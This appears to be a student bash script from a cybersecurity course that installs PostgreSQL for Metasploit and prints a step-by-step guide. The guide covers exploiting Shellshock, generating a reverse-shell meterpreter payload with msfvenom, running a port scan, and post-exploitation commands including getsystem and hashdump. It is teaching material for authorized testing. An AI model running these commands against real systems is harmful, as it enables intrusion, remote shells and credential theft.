#!/bin/bash
# metasploit_workflow.sh
# Holberton School Cybersecurity Project
# This script provides a comprehensive guide for setting up and using Metasploit with PostgreSQL

echo "================== Metasploit Setup and Usage Guide =================="
echo

# Part 1: Setup Metasploit Locally with PostgreSQL
echo "===== PART 1: SETTING UP METASPLOIT WITH POSTGRESQL ====="

echo "1. Installing PostgreSQL and dependencies..."
sudo apt update
sudo apt install -y postgresql postgresql-contrib

echo "2. Starting PostgreSQL service..."
sudo systemctl start postgresql
sudo systemctl enable postgresql

echo "3. Creating PostgreSQL user for Metasploit..."
sudo -u postgres createuser msf_user -P
# When prompted, set a secure password for the msf_user

echo "4. Creating PostgreSQL database for Metasploit..."
sudo -u postgres createdb -O msf_user msf_database

echo "5. Initializing Metasploit database..."
sudo msfdb init

echo "6. Verifying database connection..."
echo "Start msfconsole and run 'db_status' to verify connection"
echo "Command: msfconsole -q"
echo "Then inside msfconsole run: db_status"
echo

# Part 2: Basic Usage of Metasploit
echo "===== PART 2: BASIC USAGE OF METASPLOIT ====="
echo "These commands should be executed within the Metasploit console (msfconsole):"
echo
echo "1. Start the Metasploit console:"
echo "   $ msfconsole"
echo
echo "2. Search for exploits (example: searching for Apache exploits):"
echo "   msf > search name:apache type:exploit"
echo
echo "3. Select an exploit (example):"
echo "   msf > use exploit/multi/http/apache_mod_cgi_bash_env_exec"
echo
echo "4. Set exploit options (view and set required options):"
echo "   msf exploit(apache_mod_cgi_bash_env_exec) > show options"
echo "   msf exploit(apache_mod_cgi_bash_env_exec) > set RHOSTS target_ip"
echo "   msf exploit(apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/vulnerable.cgi"
echo
echo "5. Set payload:"
echo "   msf exploit(apache_mod_cgi_bash_env_exec) > set PAYLOAD linux/x86/meterpreter/reverse_tcp"
echo
echo "6. Set local host and port:"
echo "   msf exploit(apache_mod_cgi_bash_env_exec) > set LHOST your_local_ip"
echo "   msf exploit(apache_mod_cgi_bash_env_exec) > set LPORT 4444"
echo
echo "7. Run the exploit:"
echo "   msf exploit(apache_mod_cgi_bash_env_exec) > exploit"
echo
echo "8. Documenting findings using notes command:"
echo "   msf > notes -a -t host.info -d \"Apache vulnerable to Shellshock\" -h target_ip"
echo "   msf > notes -S target_ip"
echo
echo "9. Using loot command to collect data:"
echo "   msf > loot -t csv"
echo "   This will output all collected loot in CSV format"
echo

# Part 3: Creating and Using a Simple Payload
echo "===== PART 3: CREATE AND USE A SIMPLE PAYLOAD ====="

echo "1. Generate a payload using msfvenom:"
echo "   $ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=your_local_ip LPORT=4444 -f elf -o payload.elf"
echo
echo "2. Make the payload executable:"
echo "   $ chmod +x payload.elf"
echo
echo "3. Set up a handler in Metasploit to receive the connection:"
echo "   msf > use exploit/multi/handler"
echo "   msf exploit(handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp"
echo "   msf exploit(handler) > set LHOST your_local_ip"
echo "   msf exploit(handler) > set LPORT 4444"
echo "   msf exploit(handler) > exploit -j"
echo
echo "4. Execute the payload on the target system:"
echo "   $ ./payload.elf"
echo

# Part 4: Exploring Auxiliary Modules
echo "===== PART 4: EXPLORE AUXILIARY MODULES ====="

echo "1. Search for auxiliary modules (example: port scanner):"
echo "   msf > search type:auxiliary name:scanner"
echo
echo "2. Select a port scanner module:"
echo "   msf > use auxiliary/scanner/portscan/tcp"
echo
echo "3. Configure module options:"
echo "   msf auxiliary(scanner/portscan/tcp) > show options"
echo "   msf auxiliary(scanner/portscan/tcp) > set RHOSTS target_ip_or_range"
echo "   msf auxiliary(scanner/portscan/tcp) > set PORTS 20-1000"
echo
echo "4. Execute the module:"
echo "   msf auxiliary(scanner/portscan/tcp) > run"
echo
echo "5. Document findings:"
echo "   msf > notes -a -t open.port -d \"Open port discovered during scan\" -h target_ip -p port_number"
echo "   msf > loot -t csv"
echo

# Part 5: Documentation and Reporting
echo "===== PART 5: DOCUMENTATION AND REPORTING ====="

echo "1. View all stored notes:"
echo "   msf > notes"
echo
echo "2. Export notes to CSV:"
echo "   msf > notes -S target_ip -o /path/to/save/notes.csv"
echo
echo "3. View collected loot:"
echo "   msf > loot"
echo
echo "4. Export loot to CSV:"
echo "   msf > loot -t csv > /path/to/save/loot.csv"
echo
echo "5. Generate a report template (if available):"
echo "   msf > report generate -t html -o /path/to/save/report.html"
echo

echo "================== ADDITIONAL USEFUL COMMANDS =================="
echo "- View active sessions: sessions -l"
echo "- Interact with a specific session: sessions -i [session_id]"
echo "- Background current session: background"
echo "- Get system information: sysinfo"
echo "- Get current user: getuid"
echo "- Attempt privilege escalation: getsystem"
echo "- Dump hashes (if privileged): hashdump"
echo "- Help with any command: help [command]"
echo

echo "Script execution completed. Follow the instructions for each part in sequence."
echo "Remember to replace placeholders like 'your_local_ip' and 'target_ip' with actual values."
echo "For educational purposes only. Only use against systems you have permission to test."
